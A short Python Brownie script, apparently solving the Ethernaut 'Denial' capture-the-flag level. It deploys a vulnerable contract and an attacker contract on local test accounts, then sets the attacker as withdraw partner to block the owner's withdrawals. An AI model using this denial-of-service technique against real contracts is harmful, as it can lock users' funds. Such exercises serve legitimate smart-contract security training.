from brownie import accounts, config, interface, Denial, DenialAttack

def main():
    owner = accounts[0]
    hacker = accounts[1]
    target = Denial.deploy({'from': owner})
    attack = DenialAttack.deploy({'from': hacker})
    owner.transfer(to=target, amount="1 ether")
    hacker.transfer(to=target, amount="1 ether")
    denial = interface.DenialInterface(target.address)
    denial.setWithdrawPartner(attack, {'from': hacker})
    print(f'Balance: {target.balance()}')
    denial.withdraw({'from': owner, 'gas_limit': 1000000})
    print(f'Balance: {target.balance()}')
    denial.withdraw({'from': owner, 'gas_limit': 900000})
    print(f'Balance: {target.balance()}')

